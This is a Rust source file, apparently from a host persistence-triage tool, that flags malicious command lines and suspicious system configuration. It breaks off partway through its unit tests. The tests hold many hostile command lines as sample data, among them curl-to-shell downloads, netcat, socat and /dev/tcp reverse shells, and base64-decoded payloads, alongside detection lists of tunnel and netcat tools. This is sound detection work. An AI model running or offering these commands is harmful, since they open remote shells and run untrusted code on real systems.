fn downloads_and_executes(segments: &[Segment], words: &[&str]) -> bool {
    segments.iter().enumerate().filter(|(_, s)| is_fetch(s)).any(|(i, fetch)| {
        // curl ... | [sudo] sh
        let piped = segments[i + 1..].iter().take_while(|s| s.piped).any(|s| is_interpreter(s.command().unwrap_or("")));
        // curl -o f URL; chmod +x f; ./f
        let saved: Vec<&str> =
            fetch.args().iter().map(String::as_str).filter(|w| !w.starts_with('-') && !w.contains("://")).collect();
        let later = segments[i + 1..].iter().any(|s| {
            let chmod = s.name() == "chmod" && s.args().iter().any(|w| makes_executable(w));
            let runs_download = s.runs().any(|file| {
                let file = file.strip_prefix("./").unwrap_or(file);
                file.chars().any(|c| c.is_ascii_alphanumeric())
                    && saved.iter().any(|w| w.strip_prefix("./").unwrap_or(w) == file)
            });
            chmod || runs_download
        });
        piped || later
    }) || runs_substitution(words)
}

/// `bash -c "$(curl ...)"`, `eval $(curl ...)`, `source <(curl ...)`: the fetched text is the
/// code, given directly to something that runs it.
fn runs_substitution(words: &[&str]) -> bool {
    words.iter().enumerate().any(|(i, word)| {
        let Some(inner) =
            word.strip_prefix("$(").or_else(|| word.strip_prefix("<(")).or_else(|| word.strip_prefix('`'))
        else {
            return false;
        };
        let command = if inner.is_empty() { words.get(i + 1).copied().unwrap_or("") } else { inner };
        let runner = match i.checked_sub(1).map(|p| words[p]) {
            Some("-c") => i >= 2 && is_interpreter(words[i - 2]),
            Some(prev) => ["eval", "source", "."].contains(&prev),
            None => false,
        };
        runner && FETCHERS.contains(&base_name(command).as_str())
    })
}

fn decodes_payload(segments: &[Segment]) -> bool {
    segments.iter().any(|s| {
        let has = |flags: &[&str]| s.args().iter().any(|w| flags.contains(&w.as_str()));
        match s.name().as_str() {
            "base64" => has(&["-d", "-D", "--decode"]),
            "openssl" => has(&["enc", "base64"]) && has(&["-d"]),
            "xxd" => has(&["-r"]),
            _ => false,
        }
    })
}

/// `python -c`, `perl -e`, `ruby -e`, `php -r`, `node -e` with network or packed code.
fn inline_payload(words: &[&str]) -> bool {
    words.iter().enumerate().any(|(i, word)| {
        let name = base_name(word);
        let flag = match name.as_str() {
            n if n.starts_with("python") => "-c",
            "perl" | "ruby" | "node" => "-e",
            "php" => "-r",
            _ => return false,
        };
        let rest = words[i + 1..].join(" ").to_ascii_lowercase();
        words[i + 1..].contains(&flag) && INLINE_PAYLOAD.iter().any(|needle| rest.contains(needle))
    })
}

fn reverse_shell(segments: &[Segment], flat: &str) -> bool {
    let is_netcat = |s: &Segment| NETCATS.contains(&s.name().as_str());
    let netcat_exec = segments.iter().any(|s| {
        is_netcat(s) && s.args().iter().any(|w| ["-e", "-c", "--exec", "--sh-exec", "--lua-exec"].contains(&w.as_str()))
    });
    let fifo = segments.iter().any(|s| s.name() == "mkfifo") && segments.iter().any(is_netcat);
    let socat = segments.iter().any(|s| s.name() == "socat") && flat.to_ascii_lowercase().contains("exec:");
    netcat_exec || fifo || socat || flat.contains("/dev/tcp/") || flat.contains("/dev/udp/")
}

fn osascript_inline(segments: &[Segment]) -> bool {
    segments.iter().any(|s| s.name() == "osascript" && s.args().iter().any(|w| w == "-e" || w == "-l"))
}

/// The first reason a command line looks malicious, if any. These are heuristics for triage:
/// each reason is specific enough that ordinary administration rarely trips it. The line is
/// read as shell would: comments dropped, quotes removed, whitespace of any kind alike.
pub fn suspicious_command(command: &str) -> Option<&'static str> {
    let segments = segments(command);
    let flat = segments.iter().flat_map(|s| s.words.iter().map(String::as_str)).collect::<Vec<_>>();
    let text = flat.join(" ");
    let reasons: [(bool, &str); 7] = [
        (runs_from_temp(&segments), "runs from a world-writable or temporary directory"),
        (runs_hidden_path(&segments, is_list_continuation(command, &segments)), "runs from a hidden path"),
        (downloads_and_executes(&segments, &flat), "downloads and executes code"),
        (decodes_payload(&segments), "decodes an encoded payload"),
        (inline_payload(&flat), "inline interpreter with network or encoded code"),
        (reverse_shell(&segments, &text), "reverse-shell tooling"),
        (osascript_inline(&segments), "runs AppleScript from the command line"),
    ];
    reasons.iter().find(|(hit, _)| *hit).map(|&(_, why)| why)
}

const CONTROL_PLANE: [&str; 4] = ["kube-apiserver", "etcd", "kube-controller-manager", "kube-scheduler"];
/// The files k3s v1.34 writes under `server/manifests`; k3s versions differ a little.
const K3S_STOCK: [&str; 6] =
    ["ccm.yaml", "coredns.yaml", "local-storage.yaml", "rolebindings.yaml", "runtimes.yaml", "traefik.yaml"];

fn is_static_pod(record: &Value) -> bool {
    matches!(text(record, "source_kind"), "static-pod" | "k3s-static-pod")
}

fn static_pod_unexpected(record: &Value) -> Option<String> {
    if !is_static_pod(record) || record["document"] != 1 {
        return None;
    }
    let path = text(record, "source_path");
    let file = path.rsplit('/').next().unwrap_or(path);
    let stem = file.rsplit_once('.').map_or(file, |(s, _)| s);
    // kubeadm ships these four; k3s ships no static pod at all.
    if text(record, "source_kind") == "static-pod" && CONTROL_PLANE.contains(&stem) {
        return None;
    }
    let images: Vec<&str> = record["images"].as_array().into_iter().flatten().filter_map(Value::as_str).collect();
    Some(format!(
        "{file}: {} {}{}",
        text(record, "kind"),
        text(record, "name"),
        if images.is_empty() { String::new() } else { format!(" ({})", images.join(", ")) }
    ))
}

fn static_pod_host_access(record: &Value) -> Option<String> {
    if !is_static_pod(record) {
        return None;
    }
    let flags: Vec<&str> = [("privileged", "privileged"), ("host_pid", "hostPID"), ("host_network", "hostNetwork")]
        .iter()
        .filter(|(field, _)| record[*field] == true)
        .map(|(_, label)| *label)
        .collect();
    let sensitive: Vec<&str> = record["host_paths"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
        .filter(|p| *p == "/" || ["docker.sock", "containerd.sock", "crio.sock"].iter().any(|s| p.ends_with(s)))
        .collect();
    (!flags.is_empty() && !sensitive.is_empty()).then(|| {
        format!(
            "{} ({}): {} with hostPath {}",
            text(record, "name"),
            text(record, "source_path"),
            flags.join(", "),
            sensitive.join(", ")
        )
    })
}

fn k3s_auto_apply_not_stock(record: &Value) -> Option<String> {
    if text(record, "source_kind") != "k3s-auto-apply" || record["document"] != 1 {
        return None;
    }
    let path = text(record, "source_path");
    let relative = path.split_once("/server/manifests/").map_or(path, |(_, r)| r);
    let stock = K3S_STOCK.contains(&relative) || relative.starts_with("metrics-server/");
    (!stock).then(|| format!("{relative}: {} {}", text(record, "kind"), text(record, "name")))
}

/// The remote-access or tunnel tool a command line starts, by program name.
fn remote_tool(command: &str) -> Option<&'static str> {
    const TOOLS: [(&str, &str); 13] = [
        ("anydesk", "AnyDesk"),
        ("teamviewer", "TeamViewer"),
        ("rustdesk", "RustDesk"),
        ("meshagent", "MeshAgent"),
        ("ngrok", "ngrok"),
        ("cloudflared", "cloudflared"),
        ("tailscaled", "Tailscale"),
        ("zerotier-one", "ZeroTier"),
        ("frpc", "frp client"),
        ("frps", "frp server"),
        ("chisel", "chisel"),
        ("gost", "gost"),
        ("rathole", "rathole"),
    ];
    let words: Vec<String> = command
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '"' | '\''))
        .filter(|w| !w.is_empty())
        .map(|w| w.rsplit('/').next().unwrap_or(w).to_ascii_lowercase())
        .collect();
    for (i, word) in words.iter().enumerate() {
        if let Some((_, name)) = TOOLS.iter().find(|(program, _)| {
            word == program || (*program == "teamviewer" || *program == "anydesk") && word.starts_with(program)
        }) {
            return Some(name);
        }
        if word == "code" && words.get(i + 1).is_some_and(|w| w == "tunnel") || word == "code-tunnel" {
            return Some("VS Code tunnel");
        }
    }
    None
}

/// An `ssh` or `autossh` command line that forwards a port (`-R`, `-L`, `-D`, `RemoteForward`,
/// `LocalForward`, `DynamicForward`) or opens a tun device (`-w`). Only the options before the
/// destination count: what follows it is the remote command (`ls -R`).
fn ssh_tunnel(command: &str) -> Option<String> {
    let words: Vec<&str> = command.split_whitespace().collect();
    let start = words.iter().position(|w| matches!(w.rsplit('/').next(), Some("ssh" | "autossh")))?;
    // `echo ssh -R`, `man ssh`, `grep ssh`: the word is data, not the program.
    if words.iter().take(start).any(|w| matches!(*w, "echo" | "printf" | "man" | "grep" | "which" | "type")) {
        return None;
    }
    // ssh(1) options that take a value; autossh adds `-M <port>`.
    let with_value = if words.get(start).is_some_and(|w| w.ends_with("autossh")) {
        "bcDEeFIiJLlMmOopQRSWw"
    } else {
        "bcDEeFIiJLlmOopQRSWw"
    };
    let mut i = start + 1;
    while let Some(word) = words.get(i) {
        let Some(flags) = word.strip_prefix('-').filter(|f| !f.is_empty() && !f.starts_with('-')) else { break };
        for (at, letter) in flags.char_indices() {
            for (flag, what) in [
                ('R', "reverse port forward (-R)"),
                ('L', "local port forward (-L)"),
                ('D', "SOCKS proxy (-D)"),
                ('w', "tun device (-w)"),
            ] {
                if letter == flag {
                    return Some(format!("ssh {what}"));
                }
            }
            if letter == 'o' {
                let attached = flags.get(at + 1..).filter(|v| !v.is_empty());
                let option = attached.or_else(|| words.get(i + 1).copied()).unwrap_or_default().to_ascii_lowercase();
                for key in ["RemoteForward", "LocalForward", "DynamicForward", "Tunnel"] {
                    if option.starts_with(&key.to_ascii_lowercase()) {
                        return Some(format!("ssh {key} option"));
                    }
                }
            }
            if with_value.contains(letter) {
                // The value is the rest of this word, or the next word.
                if at + letter.len_utf8() == flags.len() {
                    i += 1;
                }
                break;
            }
        }
        i += 1;
    }
    None
}

fn remote_tool_present(record: &Value) -> Option<String> {
    if !matches!(text(record, "kind"), "identity" | "node" | "credentials" | "network" | "config" | "interface") {
        return None;
    }
    let tool = text(record, "tool");
    let mut parts = vec![format!("{tool} configured")];
    for (label, field) in [("user", "user"), ("id", "id"), ("name", "name"), ("server", "server")] {
        if !text(record, field).is_empty() {
            parts.push(format!("{label} {}", text(record, field)));
        }
    }
    Some(parts.join(", "))
}

fn tunnel_exposes_service(record: &Value) -> Option<String> {
    if !matches!(text(record, "kind"), "tunnel" | "proxy") || text(record, "tool") == "vscode-tunnel" {
        return None;
    }
    let target = text(record, "target");
    // cloudflared's catch-all rule answers with a status code and exposes nothing.
    if target.is_empty() || target.starts_with("http_status:") {
        return None;
    }
    Some(format!(
        "{} {} exposes {target}{}",
        text(record, "tool"),
        text(record, "name"),
        if text(record, "server").is_empty() { String::new() } else { format!(" via {}", text(record, "server")) }
    ))
}

fn vscode_tunnel_service_account(record: &Value) -> Option<String> {
    const SERVICE: [&str; 12] = [
        "root",
        "www-data",
        "nobody",
        "daemon",
        "git",
        "postgres",
        "mysql",
        "jenkins",
        "gitlab-runner",
        "tomcat",
        "nginx",
        "apache",
    ];
    let user = text(record, "user");
    (text(record, "tool") == "vscode-tunnel" && text(record, "kind") == "tunnel" && SERVICE.contains(&user))
        .then(|| format!("tunnel {} (id {}) for {user}", text(record, "name"), text(record, "id")))
}

fn vpn_hook_suspicious(record: &Value) -> Option<String> {
    const HOOKS: [&str; 12] = [
        "PostUp=",
        "PreUp=",
        "PostDown=",
        "PreDown=",
        "up=",
        "down=",
        "route-up=",
        "client-connect=",
        "ipchange=",
        "plugin=",
        "auth-user-pass-verify=",
        "tls-verify=",
    ];
    record["detail"].as_array()?.iter().filter_map(Value::as_str).find_map(|d| {
        let hook = HOOKS.iter().find(|h| d.to_ascii_lowercase().starts_with(&h.to_ascii_lowercase()))?;
        let command = d.get(hook.len()..)?;
        suspicious_command(command).map(|why| format!("{hook}{command}: {why}"))
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn malicious_command_lines_are_flagged() {
        let bad = [
            ("/tmp/.x/payload --daemon", "temporary"),
            ("/var/tmp/update", "temporary"),
            ("nohup /dev/shm/miner -o pool.example.com &", "temporary"),
            ("bash /private/tmp/run.sh", "temporary"),
            ("/Users/Shared/helper", "temporary"),
            ("-/tmp/x", "temporary"),
            ("FOO=1 python3 /tmp/a.py", "temporary"),
            ("/usr/bin/true ; /tmp/x", "temporary"),
            ("/opt/app/.cache2/run", "hidden"),
            ("~/.hidden/agent --quiet", "hidden"),
            ("curl -fsSL http://203.0.113.5/i.sh | sh", "download"),
            ("wget -qO- http://198.51.100.7/x|bash", "download"),
            ("curl http://203.0.113.5/a -o /opt/a && chmod +x /opt/a", "download"),
            ("sh -c \"$(curl -fsSL http://203.0.113.5/i)\"", "download"),
            ("echo aGk= | base64 -d | sh", "encoded"),
            ("base64 --decode /opt/p | sh", "encoded"),
            ("openssl enc -d -aes-256-cbc -in /opt/p", "encoded"),
            ("python3 -c 'import socket,os;s=socket.socket()'", "inline"),
            ("perl -e 'use Socket;'; nc 203.0.113.5 4444", "inline"),
            ("nc -e /bin/sh 203.0.113.5 4444", "reverse"),
            ("socat TCP:203.0.113.5:4444 EXEC:/bin/sh", "reverse"),
            ("bash -c 'exec 5<>/dev/tcp/203.0.113.5/80'", "reverse"),
            ("osascript -e 'do shell script \"id\"'", "AppleScript"),
            // Evasions: other spellings of the same things.
            ("cd /tmp && ./x", "temporary"),
            ("/bin/sh -c \"cd /tmp; ./x\"", "temporary"),
            ("/private/var/tmp/x", "temporary"),
            ("/var/folders/ab/xyz/T/x", "temporary"),
            ("/TMP/x", "temporary"),
            ("//tmp/x", "temporary"),
            ("/./tmp/x", "temporary"),
            ("/usr/../tmp/x", "temporary"),
            ("sudo -u root /tmp/x", "temporary"),
            ("timeout 5 /tmp/x", "temporary"),
            ("bash -c \"$(/usr/bin/curl -fsSL http://203.0.113.9/x)\"", "download"),
            ("bash -c $(curl -fsSL http://203.0.113.9/x)", "download"),
            ("eval \"$(curl -fsSL http://203.0.113.9/x)\"", "download"),
            ("source <(curl -fsSL http://203.0.113.9/x)", "download"),
            ("curl -fsSL http://203.0.113.9/x | sudo -E bash", "download"),
            ("curl -fsSL http://203.0.113.9/x | /usr/bin/env bash", "download"),
            ("curl -o f http://203.0.113.9/x; chmod 755 f", "download"),
            ("curl -o /tmp/f http://203.0.113.9/x; sh /tmp/f", "temporary"),
            ("curl -o /opt/a http://203.0.113.9/a; sh /opt/a", "download"),
            ("curl${IFS}http://203.0.113.9/i|sh", "download"),
            ("python3 -c \"import base64;exec(base64.b64decode('aW1wb3J0IG9z'))\"", "inline"),
            ("python3  -c 'import socket,pty;s=socket.socket()'", "inline"),
            ("python2.7 -c 'import socket,pty;s=socket.socket()'", "inline"),
            ("nc\t-e /bin/sh 203.0.113.9 4444", "reverse"),
            ("mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f", "reverse"),
            ("rm /tmp/f;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/g", "reverse"),
            ("ncat --sh-exec /bin/sh 203.0.113.9 4444", "reverse"),
            ("osascript -l JavaScript -e \"eval(ObjC.unwrap(x))\"", "AppleScript"),
            ("echo aGk= | base64\t-d | sh", "encoded"),
            ("base64 -D", "encoded"),
            ("{echo,Y3VybA==}|{base64,-d}|bash", "encoded"),
            ("sh /home/alice/.hidden/run.sh", "hidden"),
        ];
        for (command, expect) in bad {
            let why = suspicious_command(command).unwrap_or_else(|| panic!("not flagged: {command}"));
            assert!(why.contains(expect), "{command}: {why}");
        }
    }

    #[test]
    fn ordinary_command_lines_are_not_flagged() {
        let good = [
            "",
            "exit 0",
            "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
            "curl -fsS https://example.com/health > /var/lib/app/health",
            "curl -s https://example.com/api | jq .",
            "wget -q https://example.com/f.tgz -O /var/lib/app/f.tgz",
            "/usr/bin/rsync -a /var/lib/app/ backup:/srv ",
            "find /var/tmp -type f -mtime +7 -delete",
            "rm -rf /tmp/build-cache",
            "tar czf /var/backups/home.tgz ~/.config /home/alice/.local/share",
            "[ -f ~/.bash_aliases ] && . ~/.bash_aliases",
            "ExecStart=/usr/sbin/sshd -D $SSHD_OPTS",
            "/usr/bin/python3 /usr/lib/app/job.py --sync ",
            "python3 -c 'print(1)'",
            "/usr/bin/base64 /etc/hostname",
            "cd / && ./run.sh",
            "echo ok > /dev/null 2>&1",
            "/usr/bin/timeout 5 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron",
            "curl https://example.com/.well-known/security.txt",
            // Stock shell startup lines.
            "HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history",
            "[[ -f ${ZDOTDIR:-$HOME}/.zkbd/$TERM-$VENDOR ]] && source ${ZDOTDIR:-$HOME}/.zkbd/$TERM-$VENDOR",
            "if [[ -r ${ZDOTDIR:-$HOME}/.zkbd/${TERM}-${VENDOR} ]] ; then",
            "if [ ! -e \"$HOME/.sudo_as_admin_successful\" ] && [ ! -e \"$HOME/.hushlogin\" ] ; then",
            "  for colors in \"$HOME/.dir_colors.$TERM\" \"$HOME/.dircolors.$TERM\" \\",
            "                \"$HOME/.dir_colors\" \"$HOME/.dircolors\"; do",
            "[ -f ~/.fzf.bash ] && source ~/.fzf.bash",
            "source ~/.iterm2_shell_integration.zsh",
            "test -e \"${HOME}/.iterm2_shell_integration.zsh\" && source \"${HOME}/.iterm2_shell_integration.zsh\"",
            "source /Users/alice/.docker/init-zsh.sh || true # Added by Docker Desktop",
            "# curl http://203.0.113.9/x | sh  and /tmp/x and ~/.cache2/y",
            "# see https://example.com/.well-known/x and ~/.cache2",
            "cd /var/lib/app && ./run.sh",
            "VAR=$(curl -s https://example.com/api)",
            "curl -s -o /var/lib/app/f.json https://example.com/f; chmod 600 /var/lib/app/f.json",
            "base64 /etc/hostname",
            "python3 -c 'import json,sys;print(json.load(sys.stdin))'",
            "echo \"a;b\" | grep a",
        ];
        for command in good {
            assert_eq!(suspicious_command(command), None, "{command}");
        }
    }

    fn check(id: &str, record: &Value) -> Option<String> {
        let found: Vec<_> = CHECKS.iter().filter(|c| c.id == id && c.artifact == text(record, "artifact")).collect();
        assert_eq!(found.len(), 1, "{id}");
        (found[0].test)(record)
    }

    #[test]
    fn macos_login_and_legacy_checks_leave_stock_records_alone() {
        let hook = |kind: &str, value: &str| json!({"artifact": "login-window", "kind": kind, "name": "LoginHook", "value": value});
        assert!(check("login-hook", &hook("login_hook", "/usr/local/bin/x")).is_some());
        assert!(check("login-hook", &hook("setting", "alice")).is_none());
        assert!(check("login-hook-suspicious", &hook("login_hook", "/usr/local/bin/x")).is_none());
        let relaunch =
            |path: &str| json!({"artifact": "login-window", "kind": "relaunch_app", "path": path, "bundle_id": "x"});
        assert!(check("relaunch-app-user-location", &relaunch("/Applications/Safari.app")).is_none());
        assert!(check("relaunch-app-user-location", &relaunch("/Users/a/Downloads/x.app")).is_some());
        let rule = |name: &str, class: &str| json!({"artifact": "auth-db", "name": name, "class": class});
        assert!(check("auth-db-admin-rule-allow", &rule("system.privilege.admin", "user")).is_none());
        assert!(check("auth-db-admin-rule-allow", &rule("system.preferences", "allow")).is_none());
        assert!(check("auth-db-admin-rule-allow", &rule("system.privilege.admin", "allow")).is_some());
        let rc = |path: &str| json!({"artifact": "legacy-rc", "source_path": path, "text": ". /etc/rc.common"});
        assert!(check("legacy-rc-command", &rc("private/etc/rc.common")).is_none());
        assert!(check("legacy-rc-command", &rc("private/etc/rc.local")).is_some());
        let plugin = |id: &str| json!({"artifact": "system-plugins", "kind": "authorization_plugin", "bundle_id": id, "source_path": "p"});
        assert!(check("authorization-plugin", &plugin("com.apple.x")).is_none());
        assert!(check("authorization-plugin", &plugin("com.example.x")).is_some());
        let spotlight =
            json!({"artifact": "system-plugins", "kind": "spotlight_importer", "bundle_id": "com.example.x"});
        assert!(check("authorization-plugin", &spotlight).is_none());
        let profile = |types: Value| json!({"artifact": "config-profiles", "payload_types": types, "name": "n", "identifier": "i"});
        assert!(check("config-profile-root-certificate", &profile(json!(["com.apple.wifi.managed"]))).is_none());
        assert!(check("config-profile-root-certificate", &profile(json!(["com.apple.security.root"]))).is_some());
    }

    #[test]
    fn launchd_dyld_insert_and_systemd_ld_preload() {
        let job = |env: Value| json!({"artifact": "launchd", "label": "com.example.x", "environment": env});
        assert!(check("launchd-dyld-insert", &job(json!({"DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"}))).is_some());
        assert!(check("launchd-dyld-insert", &job(json!({"PATH": "/usr/bin"}))).is_none());
        let unit = |env: &str| json!({"artifact": "systemd-units", "environment": env});
        assert!(check("systemd-ld-preload", &unit("A=1 LD_PRELOAD=/usr/lib/x.so")).is_some());
        assert!(check("systemd-ld-preload", &unit("A=1")).is_none());
    }

    #[test]
    fn apple_label_exemption_and_btm_applications() {
        let job = |scope: &str, program: &str| {
            json!({"artifact": "launchd", "label": "com.apple.CSConfigDotMacCert-x-SharedServices.Agent", "scope": scope,
                   "source_path": "Users/a/Library/LaunchAgents/x.plist", "program": program, "program_arguments": []})
        };
        assert!(check("launchd-apple-label-outside-system", &job("user_agent", "/usr/libexec/x")).is_none());
        assert!(check("launchd-apple-label-outside-system", &job("user_agent", "/System/Library/x")).is_none());
        assert!(check("launchd-apple-label-outside-system", &job("user_agent", "/Users/a/x")).is_some());
        assert!(check("launchd-apple-label-outside-system", &job("local_daemon", "/usr/libexec/x")).is_some());
        let item = |path: &str| json!({"artifact": "btm", "executable_path": path, "team_id": "", "developer_name": "Unknown Developer"});
        assert!(check("btm-item-unsigned", &item("/Applications/Evil.app/Contents/MacOS/x")).is_some());
        assert!(check("btm-item-unsigned", &item("/System/Library/x")).is_none());
    }

    #[test]
    fn executable_text_covers_the_executable_fields_only() {
        let record = json!({"program": "/bin/a", "program_arguments": ["a", "-b"], "standard_out_path": "/var/log/allowed-text"});
        let text = executable_text(&record);
        assert!(text.contains("/bin/a") && text.contains("a -b") && !text.contains("allowed-text"));
    }

    #[test]
    fn launchd_command_keeps_arguments_after_program() {
        let job = json!({"scope": "local_daemon", "program": "/bin/sh", "program_arguments": ["sh", "-c", "curl http://203.0.113.9/x | sh"]});
        assert_eq!(launchd_command(&job), "/bin/sh -c curl http://203.0.113.9/x | sh");
        assert!(launchd_exec(&job, "_daemon").is_some());
    }

    #[test]
    fn launchd_agents_and_daemons_get_their_own_technique() {
        let job = |scope: &str| json!({"scope": scope, "program": "", "program_arguments": ["/usr/bin/curl", "-s", "http://x"]});
        assert!(launchd_exec(&job("user_agent"), "_agent").is_some());
        assert!(launchd_exec(&job("user_agent"), "_daemon").is_none());
        assert!(launchd_exec(&job("local_daemon"), "_daemon").is_some());
    }
    fn profile(line: &str) -> Value {
        json!({"artifact": "shell-profiles", "source_path": "etc/bashrc", "text": line})
    }

    #[test]
    fn stock_prompt_commands_are_not_flagged_but_code_is() {
        let stock = [
            r#"PROMPT_COMMAND=/etc/sysconfig/bash-prompt-xterm"#,
            r#"[ -e /etc/sysconfig/bash-prompt-default ] && PROMPT_COMMAND=/etc/sysconfig/bash-prompt-default"#,
            r#"PROMPT_COMMAND='printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/\~}"'"#,
            r#"PROMPT_COMMAND='printf "\033k%s@%s:%s\033\\" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/\~}"'"#,
            r#"PROMPT_COMMAND="__vte_prompt_command""#,
            r#"PROMPT_COMMAND='echo -ne "\033]0;'${i}'\007"'"#,
            r#"[ "$NEWLINE_BEFORE_PROMPT" = yes ] && PROMPT_COMMAND="PROMPT_COMMAND=echo""#,
            r#"eval 'PROMPT_COMMAND=()'"#,
            r#"PROMPT_COMMAND+=('printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD}"')"#,
            r#"PROMPT_COMMAND=$PROMPT_COMMAND"#,
        ];
        for line in stock {
            assert_eq!(check("shell-profile-suspicious", &profile(line)), None, "{line}");
        }
        let bad = [
            "PROMPT_COMMAND='/usr/local/bin/logger-hook'",
            "PROMPT_COMMAND=/etc/sysconfig/bash-prompt-evil",
            "PROMPT_COMMAND='printf x >> ~/.cache/log'",
            "PROMPT_COMMAND='printf \"$(id)\"'",
            "PROMPT_COMMAND='history -a'",
            "PROMPT_COMMAND=\"history -a; $PROMPT_COMMAND\"",
            "PROMPT_COMMAND='printf hi; /usr/local/bin/x'",
            "PROMPT_COMMAND+=('/opt/agent')",
            "PROMPT_COMMAND=\"echo hi && /opt/agent\"",
            "export PROMPT_COMMAND=\"curl http://203.0.113.5/x | sh\"",
            "PROMPT_COMMAND=`id`",
        ];
        for line in bad {
            assert!(check("shell-profile-suspicious", &profile(line)).is_some(), "{line}");
        }
        // A name that merely ends in the variable's name is another variable.
        assert_eq!(check("shell-profile-suspicious", &profile("MY_PROMPT_COMMAND=/opt/x")), None);
    }

    #[test]
    fn csh_foreach_list_is_data() {
        let line = r#"foreach file ("$HOME/.i18n" /etc/locale.conf /etc/sysconfig/i18n)"#;
        let record = json!({"artifact": "shell-profiles", "source_path": "etc/profile.d/lang.csh", "text": line});
        assert_eq!(check("shell-profile-suspicious", &record), None);
        let bad =
            json!({"artifact": "shell-profiles", "source_path": "etc/profile.d/x.csh", "text": "/home/x/.hidden/run"});
        assert!(check("shell-profile-suspicious", &bad).is_some());
    }

    #[test]
    fn stock_modprobe_install_lines_are_not_flagged_but_planted_ones_are() {
        let rec = |args: &str| json!({"artifact": "modules-load", "kind": "install", "module": "m", "arguments": args});
        let stock = [
            "/bin/true",
            "/bin/false",
            "/sbin/modprobe --ignore-install bridge && /sbin/sysctl -q -w net.bridge.bridge-nf-call-arptables=0",
            "/sbin/modprobe --first-time --ignore-install binfmt_misc && { /bin/mount -t binfmt_misc none /proc/sys/fs/binfmt_misc > /dev/null 2>&1 || :; }",
            "/sbin/modprobe --first-time --ignore-install sunrpc && { /bin/mount -t rpc_pipefs sunrpc /var/lib/nfs/rpc_pipefs > /dev/null 2>&1 || :; }",
            "/sbin/modprobe ehci_hcd ; /sbin/modprobe -i uhci_hcd ; true",
            "/sbin/modprobe -o dummy1 --ignore-install dummy",
            "/sbin/modprobe snd-card-${MODPROBE_MODULE##sound[_-]slot[_-]}",
            "{ /sbin/modprobe ov511; } ; /sbin/modprobe --first-time --ignore-install ov518",
            "/sbin/modprobe --ignore-install nf_conntrack $CMDLINE_OPTS && /sbin/sysctl --quiet --pattern 'net[.]netfilter[.]nf_conntrack.*' --system",
        ];
        for args in stock {
            assert_eq!(check("modprobe-install-command", &rec(args)), None, "{args}");
        }
        let bad = [
            "/tmp/.NXMK_MODPROBE/agent",
            "/tmp/true",
            "/bin/true ; /tmp/x",
            "/sbin/modprobe --ignore-install x && /tmp/agent",
            "/sbin/modprobe /tmp/evil.ko",
            "/sbin/modprobe x ; /bin/sh -c 'id'",
            "/sbin/modprobe x && /sbin/sysctl -w kernel.core_pattern=x",
            "/sbin/modprobe x && /bin/mount -t tmpfs none /var/tmp",
            "/sbin/modprobe x && /bin/mount -t nfsd nfsd /etc/cron.d",
            "/sbin/modprobe x && $(curl http://203.0.113.5/x)",
            "/sbin/modprobe x > /etc/cron.d/y",
            "/usr/bin/curl http://203.0.113.5/x",
        ];
        for args in bad {
            assert!(check("modprobe-install-command", &rec(args)).is_some(), "{args}");
        }
    }

    #[test]
    fn stock_pam_exec_and_rc_local_lines() {
        let pam = |args: &str| json!({"artifact": "pam", "module_type": "session", "module": "pam_exec.so", "service": "login", "arguments": args});
        assert_eq!(check("pam-exec-module", &pam("type=open_session stdout /bin/uname -snrvm")), None);
        assert!(check("pam-exec-module", &pam("type=open_session stdout /bin/uname -snrvm; /tmp/x")).is_some());
        assert!(check("pam-exec-module", &pam("/tmp/.x/agent")).is_some());
        assert!(check("pam-exec-module", &pam("stdout /usr/local/bin/uname -snrvm")).is_some());
        let rc = |t: &str| json!({"artifact": "rc-local", "text": t});
        assert_eq!(check("rc-local-command", &rc("touch /var/lock/subsys/local")), None);
        assert!(check("rc-local-command", &rc("touch /var/lock/subsys/local; /opt/x")).is_some());
        assert!(check("rc-local-command", &rc("/opt/x")).is_some());
    }

    #[test]
    fn bsd_checks_flag_planted_shapes_and_leave_stock_ones() {
        // BSD downloaders.
        assert!(suspicious_command("ftp -o - http://203.0.113.5/x.sh | sh").is_some());
        assert!(suspicious_command("fetch -qo - http://203.0.113.5/x.sh | sh").is_some());
        assert_eq!(suspicious_command("ftp -o /usr/local/share/x.tgz http://mirror.example/x.tgz"), None);
        // OpenBSD's stock ksh.kshrc alias; the same alias elsewhere, or another one, is still reported.
        let kshrc = |path: &str, text: &str| json!({"artifact": "shell-profiles", "source_path": path, "text": text});
        assert_eq!(check("shell-profile-suspicious", &kshrc("etc/ksh.kshrc", "\t\talias su=wsu")), None);
        assert!(check("shell-profile-suspicious", &kshrc("home/bob/.kshrc", "alias su=wsu")).is_some());
        assert!(check("shell-profile-suspicious", &kshrc("etc/ksh.kshrc", "alias su=/tmp/x")).is_some());
        // The stock toor account is not a second uid 0; a look-alike is.
        let toor = |gecos: &str, hash: &str| json!({"artifact": "master-passwd", "user": "toor", "uid": 0, "gecos": gecos, "hash_type": hash});
        assert_eq!(check("master-passwd-extra-uid0", &toor("Bourne-again Superuser", "none")), None);
        assert!(check("master-passwd-extra-uid0", &toor("Bourne-again Superuser", "sha512crypt")).is_some());
        assert!(check("master-passwd-extra-uid0", &toor("Toor", "none")).is_some());
        let passwd = |gecos: &str, field: &str| json!({"artifact": "passwd", "user": "toor", "uid": 0, "gecos": gecos, "password_field": field});
        assert_eq!(check("passwd-extra-uid0", &passwd("Bourne-again Superuser", "*")), None);
        assert!(check("passwd-extra-uid0", &passwd("Bourne-again Superuser", "x")).is_some());
        assert!(check(
            "master-passwd-passwordless",
            &json!({"artifact": "master-passwd", "user": "n", "passwordless": true})
        )
        .is_some());
        // rc.d, rc.conf, ttys, doas, devd, jails, loader.conf.
        let rcd =
